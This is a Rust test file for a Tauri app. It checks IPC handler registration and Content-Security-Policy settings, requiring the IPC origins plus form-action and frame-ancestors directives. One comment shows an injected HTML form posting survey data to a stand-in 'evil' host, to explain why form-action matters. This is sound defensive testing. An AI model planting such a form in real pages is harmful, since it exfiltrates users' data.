//! App-surface contract tests relocated next to the wiring they pin, ahead of
//! the crate split: `lib.rs`'s `generate_handler![]` registration and
//! `tauri.conf.json` stay with the app crate, so the tests that read them
//! live here too.

/// The body of the `generate_handler![...]` block in `src`, found by counting
/// `[`/`]` depth from the macro's opening bracket to its matching close. A
/// first-`]` slice would end the scan at the `]` of any attribute inside the
/// block (e.g. `#[cfg(feature = "e2e")]`), silently truncating the scanned
/// region and letting the contract tests below pass vacuously.
pub(super) fn generate_handler_block(src: &str) -> &str {
    let start = src
        .find("generate_handler![")
        .expect("generate_handler![ not found")
        + "generate_handler![".len();
    let mut depth = 1usize;
    let end = src[start..]
        .char_indices()
        .find_map(|(i, c)| {
            match c {
                '[' => depth += 1,
                ']' => depth -= 1,
                _ => {}
            }
            (depth == 0).then_some(i)
        })
        .expect("matching closing ] not found for generate_handler!");
    &src[start..start + end]
}

#[test]
fn generate_handler_block_scans_past_inner_brackets() {
    let src = "\
        .invoke_handler(tauri::generate_handler![\n\
            commands::project::create_project,\n\
            #[cfg(feature = \"e2e\")]\n\
            commands::debug::e2e_probe,\n\
            commands::project::after_attribute,\n\
        ])\n\
        .setup(trailing_marker)";
    let block = generate_handler_block(src);
    assert!(
        block.contains("after_attribute"),
        "an attribute's `]` inside the block must not truncate the scan; got: {block}"
    );
    assert!(
        !block.contains("trailing_marker"),
        "the scan must stop at the macro's own closing bracket; got: {block}"
    );
}

#[test]
fn the_legacy_open_project_is_not_exposed_over_ipc() {
    // `AppState::open_project` deliberately has NO canonical-storage guard
    // (see its doc comment): only the command executor and tests reach it.
    // That is only sound while the webview cannot reach it, so pin the
    // non-exposure the same way
    // `registry_covers_all_commands` reads the handler block.
    let lib_src = include_str!("../lib.rs");
    let block = generate_handler_block(lib_src);
    let exposed = block.lines().any(|line| {
        let trimmed = line.trim();
        !trimmed.starts_with("//")
            && trimmed
                .rsplit("::")
                .next()
                .is_some_and(|name| name.trim_end_matches(',').trim() == "open_project")
    });
    assert!(
        !exposed,
        "open_project gained an IPC registration - it must now run the \
         canonical-storage guard (see AppState::open_project's doc comment)"
    );
}

/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
///
/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
/// addition is gated on the isolation pattern, which this app does not use.
///
/// Omitting it does not brick the app, which is exactly why this needs a test:
/// the failure is silent. Tauri catches the CSP rejection, warns once to a
/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
/// and falls back to `postMessage` for the rest of the session - losing the
/// binary response path for every IPC reply. Nothing else in this repo can catch
/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
/// a real `tauri build`.
#[test]
fn test_csp_allows_the_tauri_ipc_origin() {
    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
    let conf: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();

    let security = &conf["app"]["security"];
    for key in ["csp", "devCsp"] {
        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
        // is deny-level here, and this module's `#[expect]` (commands/mod.rs)
        // covers `unwrap`/`expect` but deliberately not `panic!`.
        let policy = security[key].as_str();
        assert!(policy.is_some(), "app.security.{key} must be a string");
        let policy = policy.unwrap();

        let connect_src = policy
            .split(';')
            .map(str::trim)
            .find(|directive| directive.starts_with("connect-src"));
        assert!(connect_src.is_some(), "{key} must declare connect-src");
        let connect_src = connect_src.unwrap();

        for origin in ["ipc:", "http://ipc.localhost"] {
            assert!(
                connect_src.split_whitespace().any(|src| src == origin),
                "{key}'s connect-src must list `{origin}` or every invoke falls \
                 back to the slower postMessage transport; got: {connect_src}"
            );
        }

        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
        // an injected `<form method=POST action=https://evil/>` posts survey data
        // straight past it. Neither directive can break a Tauri app, so there is
        // no reason for either to be absent.
        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
            assert!(
                policy.split(';').map(str::trim).any(|d| d == directive),
                "{key} must declare `{directive}` - it does not fall back to \
                 default-src; got: {policy}"
            );
        }
    }
}
